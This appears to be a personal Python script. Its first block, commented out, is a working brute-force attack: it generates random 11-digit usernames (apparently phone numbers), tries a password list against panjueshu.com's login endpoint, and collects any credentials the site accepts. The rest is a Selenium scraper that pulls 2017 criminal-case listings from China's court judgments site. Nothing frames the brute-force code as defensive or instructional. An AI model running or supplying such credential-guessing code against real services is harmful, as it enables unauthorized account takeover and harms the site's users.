import requests
import random

# b='1234567890'
# a='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
# header={
#     'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'
# }
# p1=[]
#
# while(True):
#     user='1'+''.join([random.choice(b) for i in range(10)])
#     rd = open('./ps', 'r')
#     for p in rd.readlines():
#         passw=p
#         data={
#             'login':user,
#             'password':passw
#         }
#
#         r=requests.post(url='http://www.panjueshu.com/chongfaLogin.ashx',headers=header,data=data)
#         print(r.text)
#         if '崇法账号或密码错误' not in r.text:
#             print(r.text)
#             print(data)
#             p1.append(data)
#             break
#
# print(p1)


from selenium import webdriver
from bs4 import BeautifulSoup
import time
#http://wenshu.court.gov.cn/list/list/?sorttype=1&number=FNBGVQ9T&guid=df96ddfc-3db9-37f1b262-39e282c0a8ca&conditions=searchWord+1+AJLX++%E6%A1%88%E4%BB%B6%E7%B1%BB%E5%9E%8B:%E5%88%91%E4%BA%8B%E6%A1%88%E4%BB%B6&conditions=searchWord+%E9%AB%98%E7%BA%A7%E6%B3%95%E9%99%A2+++%E6%B3%95%E9%99%A2%E5%B1%82%E7%BA%A7:%E9%AB%98%E7%BA%A7%E6%B3%95%E9%99%A2&conditions=searchWord+2017+++%E8%A3%81%E5%88%A4%E5%B9%B4%E4%BB%BD:2017
#http://wenshu.court.gov.cn/list/list/?sorttype=1&number=FNBGVQ9T&guid=df96ddfc-3db9-37f1b262-39e282c0a8ca&conditions=searchWord+1+AJLX++%E6%A1%88%E4%BB%B6%E7%B1%BB%E5%9E%8B:%E5%88%91%E4%BA%8B%E6%A1%88%E4%BB%B6&conditions=searchWord+%E9%AB%98%E7%BA%A7%E6%B3%95%E9%99%A2+++%E6%B3%95%E9%99%A2%E5%B1%82%E7%BA%A7:%E9%AB%98%E7%BA%A7%E6%B3%95%E9%99%A2&conditions=searchWord+2017+++%E8%A3%81%E5%88%A4%E5%B9%B4%E4%BB%BD:2017
d = webdriver.Chrome()
d.get("http://wenshu.court.gov.cn/list/list/?sorttype=1&conditions=searchWord+1+AJLX++%E6%A1%88%E4%BB%B6%E7%B1%BB%E5%9E%8B:%E5%88%91%E4%BA%8B%E6%A1%88%E4%BB%B6&conditions=searchWord+%E9%AB%98%E7%BA%A7%E6%B3%95%E9%99%A2+++%E6%B3%95%E9%99%A2%E5%B1%82%E7%BA%A7:%E9%AB%98%E7%BA%A7%E6%B3%95%E9%99%A2&conditions=searchWord+2017+++%E8%A3%81%E5%88%A4%E5%B9%B4%E4%BB%BD:2017")
time.sleep(5) # 根据网络情况调整sleep时间
d.execute_script("""
var span = document.createElement(\"span\");
span.id = \"myspanspan\";
span.innerHTML = document.getElementById(\"resultList\").innerHTML;
var ele = document.body;
ele.appendChild(span);
""")
soup = BeautifulSoup(d.page_source,'html.parser',from_encoding='gb18030')
x = soup.find('span',{'id':'myspanspan'})
print(str(x))

next_=d.find_element_by_class_name('next')
next_.click()
d.set_page_load_timeout(10)
# time.sleep(5) # 根据网络情况调整sleep时间
d.execute_script("""
var span = document.createElement(\"span\");
span.id = \"myspanspan\";
span.innerHTML = document.getElementById(\"resultList\").innerHTML;
var ele = document.body;
ele.appendChild(span);
""")
soup = BeautifulSoup(d.page_source,'html.parser',from_encoding='gb18030')
x = soup.find('span',{'id':'myspanspan'})
print(str(x))
# d.close()